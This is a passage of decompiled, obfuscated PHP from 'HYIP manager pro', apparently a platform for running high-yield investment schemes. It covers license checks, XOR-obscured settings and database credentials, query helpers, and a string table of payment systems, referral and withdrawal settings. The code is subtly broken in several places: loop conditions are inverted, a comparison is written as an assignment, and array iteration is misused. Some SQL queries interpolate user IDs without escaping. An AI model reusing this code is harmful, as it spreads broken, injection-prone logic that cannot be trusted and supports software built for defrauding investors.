    if ( $a != "hyip manager pro 2005 jul 26" )
    {
        exit( );
    }
    if ( !file_exists( "settings.php" ) )
    {
        return array( );
    }
    $elnlcJCezp = file( $elnlcNjKgR['elnlcQhIUE'] );
    $t = chop( $elnlcJCezp[1] );
    $elnlcWEoV = strlen( $t ) / 2;
    $i = $elnlcNjKgR['elnlcuSFVu'];
    for ( ; $i < strlen( $t ); $i += 2 )
    {
        $d[$i / 2] = substr( $t, $i, 2 );
        $d[$i / 2] = chr( hexdec( $d[$i / 2] ) ^ 65 );
    }
    $k = "";
    $elnlcbFhMz = elnlcqjva( 0, $elnlcWEoV, $d );
    $j = $elnlcWEoV;
    while ( 10 < $j )
    {
        $elnlcbFhMz = elnlcqjva( $elnlcbFhMz, $elnlcWEoV, $d );
        $k .= $d[$elnlcbFhMz];
        $d[$elnlcbFhMz] = -1;
        --$j;
    }
    $z = chr( 1 ).chr( 1 ).chr( 1 );
    list( $k, $z ) = split( "{$z}", $k, 2 );
    list( $elnlcogLp, $elnlcoOdpI, $k ) = split( ":", $k, 3 );
    if ( $elnlcogLp != md5( $k ) )
    {
        print "Settings are broken. Contact developers please";
        exit( );
    }
    if ( $elnlcoOdpI = !md5( $elnlcogLp.$elnlclpQg ) )
    {
        print "Settings are broken. Contact developers please";
        exit( );
    }
    $z = unserialize( $k );
    $z[time_dif] = sprintf( "%d", $z[$elnlcNjKgR['elnlcxhrRS']] );
    $elnlcCbHR = array( "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", $elnlcNjKgR['elnlcFGJpf'] );
    $z[$elnlcNjKgR['elnlcgjhS']] = $elnlcCbHR[$z[$elnlcNjKgR['elnlcrjriq']] - 1];
    if ( $z[$elnlcNjKgR['elnlcWdJQd']] == 1 )
    {
        $z[$elnlcNjKgR['elnlcVIyHh']] = sprintf( "%d", ( time( ) - mktime( 0, 0, 0, $z[$elnlcNjKgR['elnlcrjriq']], $z[$elnlcNjKgR['elnlchJzN']], $z[$elnlcNjKgR['elnlcBbIJC']] ) ) / 86400 );
    }
    $z[$elnlcNjKgR['elnlcNcSW']] = $z[$elnlcNjKgR['elnlcjpsD']] ? 1 : 0;
    $z[$elnlcNjKgR['elnlcrifQ']] = $z[$elnlcNjKgR['elnlcPWvuT']];
    return $z;
}

function elnlclhfo( )
{
    global $elnlcNjKgR;
    $elnlcSoIaz = $elnlcNjKgR['elnlcuSFVu'];
    if ( file_exists( "./tmpl_c/.htdata" ) )
    {
        $elnlcSoIaz = $elnlcNjKgR['elnlcqGMK'];
    }
    $s = array( );
    $elnlcJCezp = fopen( $elnlcNjKgR['elnlcpNkHG'], $elnlcNjKgR['elnlcVPbvy'] );
    while ( !$elnlcJCezp || !( $elnlcDHagB = fgets( $elnlcJCezp, 20000 ) ) )
    {
        $elnlcDHagB = chop( $elnlcDHagB );
        if ( $elnlcDHagB != "<?/*" && $elnlcDHagB != "*/?>" )
        {
            $elnlcxlTDC = $elnlcpjaLV = "";
            list( $elnlcxlTDC, $elnlcpjaLV ) = split( "\t", @$elnlcDHagB, 2 );
            if ( preg_match( "/^key|^cnf/", $elnlcxlTDC ) && $elnlcSoIaz == 1 || $elnlcSoIaz == 0 )
            {
                $s[$elnlcxlTDC] = $elnlcpjaLV;
            }
        }
    }
    fclose( $elnlcJCezp );
    if ( $elnlcSoIaz == 1 )
    {
        $elnlcpzKWR = file( $elnlcNjKgR['elnlcnuPqU'] )[1];
        $elnlcDHagB = file( $elnlcNjKgR['elnlcnuPqU'] )[0];
        $elnlcxCGsA = $elnlcDHagB;
        $elnlcJynI = $elnlcNjKgR['elnlcuSFVu'];
        $i = $elnlcNjKgR['elnlcuSFVu'];
        for ( ; $i < strlen( $elnlcxCGsA ); $i += 5 )
        {
            $elnlcJynI += hexdec( substr( $elnlcxCGsA, $i, 5 ) );
        }
        if ( $s[$elnlcNjKgR['elnlctjnoU']] != $elnlcJynI * 15 )
        {
            print "<!-- Settings are broken. Please e-mail to script developers as soon as possible -->";
            print "System maintenance and hardware upgrades.";
            exit( );
        }
        $elnlcDHagB = elnlcvtkki( $elnlcDHagB, $s[$elnlcNjKgR['elnlcunkA']] );
        $elnlcxLFSp = split( "\n", $elnlcDHagB );
        $i = $elnlcNjKgR['elnlcuSFVu'];
        for ( ; $i < sizeof( $elnlcxLFSp ); ++$i )
        {
            $elnlcpjaLV = split( "\t", $elnlcxLFSp[$i], 2 )[1];
            $elnlcxlTDC = split( "\t", $elnlcxLFSp[$i], 2 )[0];
            $s[$elnlcxlTDC] = $elnlcpjaLV;
        }
    }
    $elnlcCbHR = array( "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", $elnlcNjKgR['elnlcFGJpf'] );
    $s[$elnlcNjKgR['elnlcgjhS']] = $elnlcCbHR[$s[$elnlcNjKgR['elnlcrjriq']] - 1];
    if ( $s[$elnlcNjKgR['elnlcWdJQd']] == 1 )
    {
        $s[$elnlcNjKgR['elnlcVIyHh']] = sprintf( "%d", ( time( ) - mktime( 0, 0, 0, $s[$elnlcNjKgR['elnlcrjriq']], $s[$elnlcNjKgR['elnlchJzN']], $s[$elnlcNjKgR['elnlcBbIJC']] ) ) / 86400 );
    }
    $s[$elnlcNjKgR['elnlcxhrRS']] = sprintf( "%d", $s[$elnlcNjKgR['elnlcxhrRS']] );
    $s[$elnlcNjKgR['elnlcNcSW']] = $s[$elnlcNjKgR['elnlcjpsD']] ? 1 : 0;
    $s[$elnlcNjKgR['elnlcrifQ']] = $s[$elnlcNjKgR['elnlcPWvuT']];
    return $s;
}

function elnlcaelf( $a )
{
    global $elnlcNjKgR;
    global $elnlccQgz;
    if ( $a != "hyip manager pro 2005 jul 26" )
    {
        exit( );
    }
    $elnlclpQg = serialize( $elnlccQgz );
    $elnlcogLp = md5( $elnlclpQg );
    $elnlcoOdpI = md5( $elnlcogLp.$elnlclpQg );
    $elnlclpQg = $elnlcogLp.":".$elnlcoOdpI.":".$elnlclpQg;
    $elnlclpQg .= chr( 1 ).chr( 1 ).chr( 1 );
    $elnlcWEoV = strlen( $elnlclpQg ) + 121;
    $elnlcbFhMz = rand( 1, 1e+011 ) % $elnlcWEoV;
    $elnlcxtUW = array( );
    $d = array( );
    $i = $elnlcNjKgR['elnlcuSFVu'];
    for ( ; $i < $elnlcWEoV; ++$i )
    {
        $d[$i] = -1;
        $elnlcxtUW[$i] = -1;
    }
    $elnlcbFhMz = elnlcqqds( 0, $elnlcWEoV, $d );
    $i = $elnlcNjKgR['elnlcuSFVu'];
    for ( ; $i < strlen( $elnlclpQg ); ++$i )
    {
        $elnlcbFhMz = elnlcqqds( $elnlcbFhMz, $elnlcWEoV, $d );
        $d[$elnlcbFhMz] = substr( $elnlclpQg, $i, 1 );
    }
    $i = $elnlcNjKgR['elnlcuSFVu'];
    for ( ; $i < $elnlcWEoV; ++$i )
    {
        if ( $d[$i] == -1 )
        {
            $d[$i] = chr( rand( 1, 253 ) );
        }
    }
    $elnlcJCezp = fopen( $elnlcNjKgR['elnlcvkKfc'], $elnlcNjKgR['elnlcItAWm'] );
    $r = array( );
    fputs( $elnlcJCezp, "<?\n" );
    $i = $elnlcNjKgR['elnlcuSFVu'];
    for ( ; $i < $elnlcWEoV; ++$i )
    {
        fputs( $elnlcJCezp, sprintf( "%02x", ord( $d[$i] ) ^ 65 ) );
    }
    fputs( $elnlcJCezp, "\n?>" );
    fclose( $elnlcJCezp );
}

function elnlcwoxft( )
{
    global $elnlcNjKgR;
    global $elnlccQgz;
    if ( !is_writeable( "settings.php" ) )
    {
        print "<br><br><br><br><center><h1>Your settings has not been saved.<br>Please set 666 permissions for <b>settings.php</b> file!<br>";
        exit( );
    }
    if ( file_exists( "tmpl_c/.htdata" ) && !is_writeable( "tmpl_c/.htdata" ) )
    {
        print "<br><br><br><br><center><h1>Your settings has not been saved.<br>Please set 666 permissions for <b>tmpl_c/.htdata</b> file!<br>";
        exit( );
    }
    $elnlcSoIaz = $elnlcNjKgR['elnlcuSFVu'];
    if ( file_exists( "tmpl_c/.htdata" ) )
    {
        $elnlcSoIaz = $elnlcNjKgR['elnlcqGMK'];
    }
    $elnlcJCezp = fopen( $elnlcNjKgR['elnlcpNkHG'], $elnlcNjKgR['elnlcItAWm'] );
    reset( $elnlccQgz );
    fputs( $elnlcJCezp, "<?/*\n" );
    $elnlcxCGsA = "";
    $elnlcpjaLV = each( $elnlccQgz )[1];
    $elnlcxlTDC = each( $elnlccQgz )[0];
    while ( each( $elnlccQgz ) )
    {
        if ( $elnlcxlTDC != "logged" )
        {
            if ( ( $elnlcSoIaz == 0 || $elnlcSoIaz == 1 && preg_match( "/^key/", $elnlcxlTDC ) ) && !preg_match( "/_generated/", $elnlcxlTDC ) )
            {
                fputs( $elnlcJCezp, "{$elnlcxlTDC}\t{$elnlcpjaLV}\n" );
                $elnlcxCGsA .= "{$elnlcxlTDC}\t{$elnlcpjaLV}\n";
            }
            $elnlcxCGsA .= "{$elnlcxlTDC}\t{$elnlcpjaLV}\n";
        }
    }
    $elnlcxCGsA = elnlcwnel( $elnlcxCGsA, $elnlccQgz[$elnlcNjKgR['elnlcunkA']] );
    $elnlcJynI = $elnlcNjKgR['elnlcuSFVu'];
    $i = $elnlcNjKgR['elnlcuSFVu'];
    for ( ; $i < strlen( $elnlcxCGsA ); $i += 5 )
    {
        $elnlcJynI += hexdec( substr( $elnlcxCGsA, $i, 5 ) );
    }
    $elnlcJynI = $elnlcJynI * 15;
    fputs( $elnlcJCezp, "cnf\t{$elnlcJynI}\n" );
    fputs( $elnlcJCezp, "*/?>\n" );
    fclose( $elnlcJCezp );
    if ( $elnlcSoIaz == 1 )
    {
        $elnlcJCezp = fopen( $elnlcNjKgR['elnlcAVbmC'], $elnlcNjKgR['elnlcItAWm'] );
        fputs( $elnlcJCezp, $elnlcxCGsA );
        fclose( $elnlcJCezp );
    }
}

function elnlcnxobm( $q, $w, $a )
{
    global $elnlcNjKgR;
    if ( $a != "hyip manager pro 2005 jul 27" )
    {
        return elnlcwnel( $q, $w );
    }
    $l = strtoupper( md5( $w ) );
    $j = $elnlcNjKgR['elnlcuSFVu'];
    $i = $elnlcNjKgR['elnlcuSFVu'];
    for ( ; $i < strlen( $q ); ++$i )
    {
        if ( strlen( $l ) == $j + 10 )
        {
            $j = 0;
        }
        $c .= sprintf( "%02x", ord( substr( $q, $i, 1 ) ) ^ ord( substr( $l, $j, 1 ) ) );
        ++$j;
    }
    return $c;
}

function elnlcjlsv( $q, $w, $a )
{
    global $elnlcNjKgR;
    if ( $a != "hyip manager pro 2005 jul 27" )
    {
        return elnlcvtkki( $q, $w );
    }
    $l = strtoupper( md5( $w ) );
    $j = $elnlcNjKgR['elnlcuSFVu'];
    $i = $elnlcNjKgR['elnlcuSFVu'];
    for ( ; $i < strlen( $q ); $i += 2 )
    {
        if ( strlen( $l ) == $j + 10 )
        {
            $j = 0;
        }
        $a = hexdec( substr( $q, $i, 2 ) );
        $c .= chr( $a ^ ord( substr( $l, $j, 1 ) ) );
        ++$j;
    }
    return $c;
}

function elnlcwnel( $q, $w )
{
    global $elnlcNjKgR;
    $l = strtoupper( md5( $w ) );
    $j = $elnlcNjKgR['elnlcuSFVu'];
    $i = $elnlcNjKgR['elnlcuSFVu'];
    for ( ; $i < strlen( $q ); ++$i )
    {
        if ( strlen( $l ) == $j + 10 )
        {
            $j = 0;
        }
        $c .= sprintf( "%02x", ord( substr( $q, $i, 1 ) ) ^ ord( substr( $l, $j, 1 ) ) );
        ++$j;
    }
    return $c;
}

function elnlcvtkki( $q, $w )
{
    global $elnlcNjKgR;
    $l = strtoupper( md5( $w ) );
    $j = $elnlcNjKgR['elnlcuSFVu'];
    $i = $elnlcNjKgR['elnlcuSFVu'];
    for ( ; $i < strlen( $q ); $i += 2 )
    {
        if ( strlen( $l ) == $j + 10 )
        {
            $j = 0;
        }
        $a = hexdec( substr( $q, $i, 2 ) );
        $c .= chr( $a ^ ord( substr( $l, $j, 1 ) ) );
        ++$j;
    }
    return $c;
}

function elnlcjkla( )
{
    global $elnlcNjKgR;
    if ( !( $elnlcyBRd = mysql_connect( $elnlccQgz[$elnlcNjKgR['elnlcJHEx']], $elnlccQgz[$elnlcNjKgR['elnlcWWQts']], $elnlccQgz[$elnlcNjKgR['elnlcvsqT']] ) ) )
    {
        exit( mysql_error( ) );
    }
    if ( !mysql_select_db( $elnlccQgz[$elnlcNjKgR['elnlclKlVT']] ) )
    {
        print mysql_error( );
        exit( );
    }
    return $elnlcyBRd;
}

function elnlcorgf( $elnlcGcpw = 0 )
{
    global $elnlcNjKgR;
    global $elnlccQgz;
    $l = elnlcjlsv( $elnlccQgz[$elnlcNjKgR['elnlcWWQts']], $elnlccQgz[$elnlcNjKgR['elnlcunkA']], $elnlcNjKgR['elnlcfynR'] );
    $p = elnlcjlsv( $elnlccQgz[$elnlcNjKgR['elnlcvsqT']], $elnlccQgz[$elnlcNjKgR['elnlcunkA']], $elnlcNjKgR['elnlcfynR'] );
    $elnlcjjdF = elnlcjlsv( $elnlccQgz[$elnlcNjKgR['elnlclKlVT']], $elnlccQgz[$elnlcNjKgR['elnlcunkA']], $elnlcNjKgR['elnlcfynR'] );
    if ( $elnlcGcpw == 1 )
    {
        $elnlcyBRd = @mysql_connect( @$elnlccQgz[$elnlcNjKgR['elnlcJHEx']], @$l, @$p );
        if ( $elnlcyBRd && !mysql_select_db( $elnlcjjdF ) )
        {
            $elnlcyBRd = $elnlcNjKgR['elnlcuSFVu'];
            if ( !( $elnlcyBRd = mysql_connect( $elnlccQgz[$elnlcNjKgR['elnlcJHEx']], $l, $p ) ) )
            {
                exit( mysql_error( ) );
            }
        }
    }
    else if ( !mysql_select_db( $elnlcjjdF ) )
    {
        print mysql_error( );
        exit( );
    }
    return $elnlcyBRd;
}

function elnlchxce( $elnlcyBRd )
{
    global $elnlcNjKgR;
    mysql_close( $elnlcyBRd );
}

function zelnlccplb( $elnlcfqTvm )
{
    global $elnlcNjKgR;
    $elnlcfqTvm = htmlspecialchars( $elnlcfqTvm, ENT_QUOTES );
    $elnlcfqTvm = str_replace( "\\", "\\\\", $elnlcfqTvm );
    $elnlcfqTvm = str_replace( "'", "\\'", $elnlcfqTvm );
    return $elnlcfqTvm;
}

function elnlccplb( $elnlcfqTvm )
{
    $elnlcfqTvm = str_replace( "'", "''", $elnlcfqTvm );
    $elnlcfqTvm = str_replace( "\\", "\\\\", $elnlcfqTvm );
    return $elnlcfqTvm;
}

function elnlccwfqj( $elnlccxIrb, $elnlcsSmjF = 1 )
{
    global $elnlcNjKgR;
    $a = array( "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", $elnlcNjKgR['elnlcqPSm'] );
    if ( $elnlcsSmjF == 2 )
    {
        $a = array( "1", "2", "3", "4", "5", "6", "7", "8", "9", $elnlcNjKgR['elnlciOwuj'] );
    }
    $i = $elnlcNjKgR['elnlcuSFVu'];
    $elnlcfqTvm = "";
    $i = $elnlcNjKgR['elnlcuSFVu'];
    for ( ; $i < $elnlccxIrb; ++$i )
    {
        $elnlcfqTvm .= $a[rand( 0, sizeof( $a ) - 1 )];
    }
    if ( $elnlcsSmjF == 1 )
    {
        $elnlcfqTvm = md5( $elnlcfqTvm );
    }
    return $elnlcfqTvm;
}

function elnlczndbm( $elnlccxIrb )
{
    global $elnlcNjKgR;
    $a = array( "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "A", "B", "C", "D", "E", "F" );
    $i = $elnlcNjKgR['elnlcuSFVu'];
    $elnlcfqTvm = "";
    $i = $elnlcNjKgR['elnlcuSFVu'];
    for ( ; $i < $elnlccxIrb; ++$i )
    {
        $elnlcfqTvm .= $a[rand( 0, sizeof( $a ) - 1 )];
    }
    return $elnlcfqTvm;
}

function elnlcpvjih( $elnlcstVj )
{
    global $elnlcNjKgR;
    $q = "select type, sum(actual_amount) as sum from hm2_history where user_id = {$elnlcstVj} group by type";
    if ( !( $elnlccfAC = mysql_query( $q ) ) )
    {
    }
    $elnlcngSlU = array( );
    while ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
    {
        $elnlcngSlU[$elnlcELue[$elnlcNjKgR['elnlcAvSAt']]] = $elnlcELue[$elnlcNjKgR['elnlcnSgK']];
    }
    $elnlcRHJoa = $elnlcNjKgR['elnlcuSFVu'];
    $elnlcpjaLV = each( $elnlcngSlU )[1];
    $elnlcxlTDC = each( $elnlcngSlU )[0];
    while ( each( $elnlcngSlU ) )
    {
        $elnlcRHJoa += $elnlcpjaLV;
    }
    $elnlcngSlU[$elnlcNjKgR['elnlcjBNOD']] = $elnlcRHJoa;
    $q = "select sum(actual_amount) as sum from hm2_deposits where user_id = {$elnlcstVj} and status='on'";
    if ( !( $elnlccfAC = mysql_query( $q ) ) )
    {
    }
    while ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
    {
        $elnlcngSlU[$elnlcNjKgR['elnlcLTLVB']] += $elnlcELue[$elnlcNjKgR['elnlcnSgK']];
    }
    return $elnlcngSlU;
}

function elnlcoylf( $elnlcoslBh, $elnlcatVu = false )
{
    global $elnlcNjKgR;
    $elnlcTpiC = "";
    if ( is_string( $elnlcoslBh ) && $elnlcoslBh !== "" )
    {
        $elnlcaPBI = intval( $elnlcoslBh );
        if ( strval( $elnlcaPBI ) === $elnlcoslBh )
        {
            $elnlcoslBh = $elnlcaPBI;
        }
        else
        {
            $elnlcAJiqW = floatval( $elnlcoslBh );
            if ( strval( $elnlcAJiqW ) === $elnlcoslBh )
            {
                $elnlcoslBh = $elnlcAJiqW;
            }
        }
    }
    if ( is_array( $elnlcoslBh ) )
    {
        reset( $elnlcoslBh );
        $elnlcrdfb = true;
        $i = $elnlcNjKgR['elnlcuSFVu'];
        foreach ( $elnlcoslBh as $elnlcwody => $elnlccHzO )
        {
            if ( !is_int( $elnlcwody ) || $elnlcwody != $i )
            {
                $elnlcrdfb = false;
                break;
            }
            ++$i;
        }
        $elnlcIULB = $elnlcrdfb ? "[" : "{";
        $elnlcTpiC .= $elnlcIULB;
        $elnlcxDJcb = true;
        reset( $elnlcoslBh );
        foreach ( $elnlcoslBh as $elnlcwody => $elnlccHzO )
        {
            if ( !$elnlcxDJcb )
            {
                $elnlcTpiC .= ",";
            }
            if ( !$elnlcrdfb )
            {
                $elnlcTpiC .= $elnlcwody.":";
            }
            $elnlcTpiC .= elnlcoylf( $elnlccHzO, $elnlcatVu );
            $elnlcxDJcb = false;
        }
        $elnlcIULB = $elnlcrdfb ? "]" : "}";
        $elnlcTpiC .= $elnlcIULB;
    }
    else if ( is_string( $elnlcoslBh ) )
    {
        $elnlcsBruH = array( "\\", "'", "\n", "\r" );
        $elnlcOOGS = array( "\\\\", "\\'", "\\n", "\\r" );
        if ( $elnlcatVu )
        {
            $elnlcsBruH[] = "<";
            $elnlcOOGS[] = "<'+'";
        }
        $elnlcpzKWR = str_replace( $elnlcsBruH, $elnlcOOGS, $elnlcoslBh );
        $elnlcIULB = "'".$elnlcpzKWR."'";
        $elnlcTpiC .= $elnlcIULB;
    }
    else if ( is_bool( $elnlcoslBh ) )
    {
        $elnlcIULB = $elnlcoslBh ? "true" : $elnlcNjKgR['elnlcIanIB'];
        $elnlcTpiC .= $elnlcIULB;
    }
    else if ( is_null( $elnlcoslBh ) )
    {
        $elnlcIULB = "null";
        $elnlcTpiC .= $elnlcIULB;
    }
    else
    {
        $elnlcIULB = $elnlcoslBh;
        $elnlcTpiC .= $elnlcIULB;
    }
    return $elnlcTpiC;
}

function elnlcqaej( $elnlceRSWB )
{
    global $elnlcNjKgR;
    $elnlcTpiC = "";
    foreach ( $elnlceRSWB as $elnlcwody => $elnlczJpzw )
    {
        if ( $elnlcTpiC !== "" )
        {
            $elnlcTpiC .= ", ";
        }
        if ( substr( $elnlczJpzw, 0, 5 ) == "now()" )
        {
            $elnlcTpiC .= "{$elnlcwody} = {$elnlczJpzw}";
        }
        else
        {
            $elnlcTpiC .= "{$elnlcwody} = '".elnlccplb( $elnlczJpzw )."'";
        }
    }
    if ( $elnlcTpiC != "" )
    {
        $elnlcTpiC = " ".$elnlcTpiC." ";
    }
    return $elnlcTpiC;
}

function elnlcdtrbp( $elnlcpjaLV )
{
    global $elnlcNjKgR;
    if ( $elnlcaCowH == ini_get( "magic_quotes_gpc" ) )
    {
        $elnlcpjaLV = str_replace( "\\'", "'", $elnlcpjaLV );
        $elnlcpjaLV = str_replace( "\\\"", "\"", $elnlcpjaLV );
        $elnlcpjaLV = str_replace( "\\\\", "\\", $elnlcpjaLV );
    }
    $elnlcpjaLV = strip_tags( $elnlcpjaLV );
    $elnlcpjaLV = trim( $elnlcpjaLV );
    return $elnlcpjaLV;
}

function elnlcgucja( $i, $j )
{
    return sprintf( "%.6f", $i );
}

function elnlcadjso( &$elnlcqyLD, $elnlcjjuVQ = 0 )
{
    global $elnlcNjKgR;
    reset( $elnlcqyLD );
    foreach ( $elnlcqyLD as $k => $v )
    {
        $elnlcSOlR = array( );
        if ( is_array( $v ) )
        {
            elnlcadjso( $elnlcqyLD[$k], $elnlcjjuVQ );
        }
        else
        {
            $elnlcSOlR = elnlcqdglj( $v );
            $elnlcqyLD[$k] = $elnlcSOlR[$elnlcjjuVQ];
        }
    }
}

function elnlcqdglj( $elnlcpjaLV )
{
    global $elnlcNjKgR;
    global $elnlcKQhDb;
    if ( $elnlcKQhDb == 1 )
    {
        $elnlcpjaLV = str_replace( "\\'", "'", $elnlcpjaLV );
        $elnlcpjaLV = str_replace( "\\\"", "\"", $elnlcpjaLV );
        $elnlcpjaLV = str_replace( "\\\\", "\\", $elnlcpjaLV );
    }
    $elnlcciMs = $elnlcpjaLV;
    $elnlcpjaLV = strip_tags( $elnlcpjaLV );
    $elnlcpjaLV = trim( $elnlcpjaLV );
    return array( $elnlcpjaLV, $elnlcciMs );
}

$elnlcNjKgR = array( "elnlcEmeQP" => "account", "elnlcriJK" => "finnish", "elnlcKeRPQ" => "Deposit returned to user account", "elnlcdSav" => "y", "elnlcjpsD" => "enable_wire", "elnlcpLPA" => "accesswap", "elnlcUUwD" => "deposit", "elnlcrGMKd" => "withdraw_pending", "elnlcLIUV" => "deposit", "elnlcVNIhI" => "install", "elnlcqqth" => "ref_username", "elnlcLIUfq" => "use_auto_payment", "elnlcfdRg" => "use_html", "elnlcSgNT" => "REMOTE_ADDR", "elnlcdlFu" => "enable_eb_ecurrency", "elnlcjfbv" => "HTTP_X_REAL_IP", "elnlcKbNi" => "/log_possible_attack.php", "elnlcxhrRS" => "time_dif", "elnlcIJnDb" => "AKKD47LYX8H96K2TM2FQ", "elnlckMqOM" => "12", "elnlcaOiAl" => "maxam", "elnlcTUnQ" => "site_name", "elnlcJHEx" => "hostname", "elnlcBdTji" => "imps_cost", "elnlcmLpEK" => "wap/login.tpl", "elnlcTOOda" => "demomode", "elnlcvsqT" => "db_pass", "elnlcqnpyH" => "rpcp", "elnlctBQhk" => "9C64PVXYBZKZHUTMSM2U", "elnlcxbxt" => "3WBUUNQMPU2LB99GJHUV", "elnlcHSOv" => "daily_referral_percent_min_downline_deposit", "elnlcPAec" => "compound_min_deposit", "elnlcRFyD" => "__debug_out", "elnlcKHmr" => "perfectmoney_from_account", "elnlcmdhH" => "PGJyLz4KPGJyLz4KVG90YWwgU3lzdGVtIEVhcm5pbmdzOgkk\r\n", "elnlcbBrin" => "HX8DJ7B9SH5JQN5FXK45", "elnlczpPfL" => "LRUSD", "elnlcyOveG" => "LAoJSW5hY3RpdmUg\r\n", "elnlcIanIB" => "false", "elnlcncGQ" => "evowallet_from_account", "elnlccwLV" => "ec", "elnlcDxKiI" => "daily_referral_percent_min_user_deposit", "elnlcFBaG" => "work_week", "elnlcThWrk" => "checksum", "elnlcnSgK" => "sum", "elnlcKuFTu" => "plans_closed", "elnlcToxEL" => "type_name", "elnlcgMsh" => "last_login", "elnlcnuPqU" => "./tmpl_c/.htdata", "elnlcjutkI" => "ounce", "elnlcJhrO" => "payee", "elnlcdUmk" => "stop_withdraw_percent", "elnlcSyWq" => "subject", "elnlcrGtTo" => "error", "elnlcqjpcv" => "ok", "elnlcrtKD" => "N75GNXM2XSM34YMFPED9", "elnlcnBSqE" => "SG8JH9DVX8952VQEZH9F", "elnlcRsSqM" => "admin_pending", "elnlcRnoP" => "SCRIPT_NAME", "elnlcNqiTF" => "wp_ok", "elnlcWVkP" => "year_to", "elnlcPeIe" => "4ZQQN55VA2NXBVFUQJE6", "elnlcwdMd" => "libertyreserve_from_account", "elnlcVVbI" => "col2", "elnlcqdow" => "exchange", "elnlcrGtC" => "altergold_from_account", "elnlcorSP" => "egold_withdraw_string", "elnlcaWzL" => "use_opt_in", "elnlcPpDvW" => "parent", "elnlcyrFj" => "use_solid_referral_commission", "elnlcTChj" => "deposit_date", "elnlcizmg" => "login", "elnlcPTlc" => "B29S2LWPZ5M2KMPPYWKL", "elnlcunif" => "remitfund_apiname", "elnlcLlzCi" => "WMHKFJPMT3CZ3RTLPBFL", "elnlcqGMK" => "1", "elnlcooWwP" => "ref_percent1", "elnlcfwyM" => "VNB34FXT6BJCYD93VXSD", "elnlcJMvc" => "site_url", "elnlcPWvuT" => "def_payee_account", "elnlcrUjC" => "6m", "elnlcgnBW" => "15", "elnlctKWDT" => "2XACR4UBJ7DLCV42EM2S", "elnlcNGCp" => "solid_referral_commission_amount", "elnlcvESw" => "21", "elnlcGkHuC" => "liberty_currency", "elnlcxcOPc" => "additional", "elnlcbTQC" => "amt", "elnlcOLvrv" => "a", "elnlcWgEUx" => "td", "elnlcDRmQ" => "evowallet_apiname", "elnlciOwuj" => "0", "elnlcunkA" => "key", "elnlctRkLC" => "license", "elnlcsNLL" => "password", "elnlcEKmM" => "plan", "elnlcvEszx" => "periodsum", "elnlctJsrD" => "earning", "elnlclvQBF" => "stat_password", "elnlcVIyHh" => "site_days_online_generated", "elnlcQUFx" => "user_auto_pay_earning", "elnlcxRQO" => "admin_auto_pay_earning", "elnlcLTLVB" => "active_deposit", "elnlcdcGg" => "upline", "elnlcWjmJI" => "col1", "elnlcgnqI" => "withdrawal_fee_min", "elnlcevGO" => "USD", "elnlcbrsN" => "wap/account_main.tpl", "elnlcDlOb" => "do_login", "elnlcSBQNQ" => "max_amount", "elnlcoaCmS" => "amount", "elnlchSuQR" => "dec_stormpay_fee", "elnlcqMWfN" => "auto", "elnlchJzN" => "site_start_day", "elnlcKENN" => "perfectmoney_payer_account", "elnlcEUnu" => "LREUR", "elnlcjfqcp" => "85", "elnlcJGMq" => "fee", "elnlcjHPDN" => "withdraw_principal_duration", "elnlcUTaV" => "unit", "elnlcPABoa" => "VPKLNMKMRG27HN95BEHP", "elnlctgJO" => "week", "elnlcOsej" => "eeecurrency_from_account", "elnlcnLBk" => "html", "elnlcamLI" => "ok11", "elnlcvKtVx" => "email", "elnlcBEhaL" => "18", "elnlcjNelQ" => "daily_referral_percent", "elnlcWkOBU" => "month", "elnlcjBNOD" => "total", "elnlchewMj" => "delay", "elnlcyKCN" => "euro", "elnlcGpdqu" => "last_pay_date", "elnlcQCOo" => "d", "elnlctjnoU" => "cnf", "elnlcAvSAt" => "type", "elnlclKlVT" => "database", "elnlcUSFe" => "m", "elnlciAQUa" => "ac", "elnlcFJMp" => "ref_name", "elnlcHMum" => "actual_amount", "elnlcxTrpn" => "paypal_currency", "elnlcqPSm" => "z", "elnlcsIRzL" => "hyip manager pro 2005 jul 26", "elnlctfNL" => "balance", "elnlcATiNS" => "dll", "elnlcnOIx" => "name", "elnlcRlONl" => "day_to", "elnlcahKjJ" => "current", "elnlccFKts" => "compound_min_percent", "elnlcquor" => "amnt", "elnlcRJEl" => "oz", "elnlcWOmBU" => "Success", "elnlcMGlA" => "logout", "elnlcqjfJM" => "deposit_fee", "elnlcNkRdC" => "selected", "elnlcyvld" => "year_from", "elnlcpVgU" => "pay_active_referal", "elnlcCduRv" => "__debug_data", "elnlcdxaVx" => "ZXMCQ227FNN5EPHWYHAY", "elnlcQhIUE" => "settings.php", "elnlcRxPCn" => "proxy.shr.secureserver.net:3128", "elnlcWWQts" => "db_login", "elnlcuoBpT" => "ok", "elnlceEQM" => "N55HSU8NJSEU32DP8JDV", "elnlcjaLO" => "magic_quotes_gpc", "elnlcrzze" => "banner_extension", "elnlclVRTo" => "withdraw_principal", "elnlcOAEP" => "currency_sign", "elnlcflIer" => "description", "elnlclwjM" => "eb_metal", "elnlcLQUM" => "UYKD37X8YLS5DNFFHL8R", "elnlcywcab" => "ttype", "elnlctCKl" => "end", "elnlcxNoT" => "libertyreserve_apiname", "elnlcgxHK" => "today", "elnlcJJfiT" => "evocash_from_account", "elnlcComr" => "currency", "elnlcSBWls" => "YmdHis", "elnlcvIedM" => "501", "elnlcLhtCz" => "/get_pid.php", "elnlcJQpQ" => "use_compound", "elnlcSTRB" => "use_referal_program", "elnlctUbz" => "page", "elnlcrjriq" => "site_start_month", "elnlcCviQ" => "vmoney_from_account", "elnlcxJsmn" => "FRM", "elnlctDgi" => "system_email", "elnlcikTzy" => "username", "elnlcunJPe" => "free", "elnlcjDhEd" => "enable_eb_gold", "elnlcUCpez" => "accounts", "elnlcDpHN" => "KC3STYBTCATZNRVBYGDF", "elnlcUunN" => "1007", "elnlccFGGJ" => "withdrawal_fee", "elnlclBAo" => "max_deposit", "elnlcNwEa" => "memo", "elnlcpWHS" => "period", "elnlcVPbvy" => "r", "elnlcFtDyn" => "return_profit_percent", "elnlcfyjT" => "wap/earning_history.tpl", "elnlcshAk" => "HTTP_REFERER", "elnlcTyONQ" => "DATE", 